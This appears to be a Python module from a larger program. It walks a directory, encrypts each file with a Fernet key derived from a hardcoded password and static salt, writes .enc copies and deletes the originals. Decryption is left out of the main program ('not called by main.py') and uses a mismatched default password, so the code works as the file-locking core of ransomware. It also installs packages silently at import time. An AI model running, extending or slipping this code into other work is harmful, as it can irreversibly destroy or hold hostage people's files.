# encryption.py
import os
import logging
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    import base64
except ImportError:
    import subprocess
    import sys
    subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography"])
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    import base64

def generate_key(password=b"Xre4hw4mwb1lyVcR3k_NmTbmaHmzi_XCrZ4yt1VJEjU="):  # Replace with a strong password
    """Generate a Fernet key from a password."""
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=b"static_salt_16_bytes",  # In production, use a random salt per file
        iterations=100000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(password))
    return key

def encrypt_files(file_path):
    """Encrypt files in the directory with AES (Fernet)."""
    key = generate_key()
    fernet = Fernet(key)
    try:
        for filename in os.listdir(file_path):
            full_path = os.path.join(file_path, filename)
            if os.path.isfile(full_path) and not filename.endswith(".zip") and not filename.endswith(".log"):
                with open(full_path, "rb") as f:
                    data = f.read()
                encrypted_data = fernet.encrypt(data)
                with open(full_path + ".enc", "wb") as f:
                    f.write(encrypted_data)
                os.remove(full_path)  # Remove original file
                logging.info(f"Encrypted: {filename}")
    except Exception as e:
        logging.error(f"Error encrypting files: {e}")

def decrypt_files(file_path, password=b"secretpassword123!"):  # For testing decryption
    """Decrypt files (not called by main.py, for recovery)."""
    key = generate_key(password)
    fernet = Fernet(key)
    try:
        for filename in os.listdir(file_path):
            full_path = os.path.join(file_path, filename)
            if os.path.isfile(full_path) and filename.endswith(".enc"):
                with open(full_path, "rb") as f:
                    encrypted_data = f.read()
                decrypted_data = fernet.decrypt(encrypted_data)
                original_path = full_path[:-4]  # Remove .enc
                with open(original_path, "wb") as f:
                    f.write(decrypted_data)
                os.remove(full_path)
                logging.info(f"Decrypted: {filename}")
    except Exception as e:
        logging.error(f"Error decrypting files: {e}")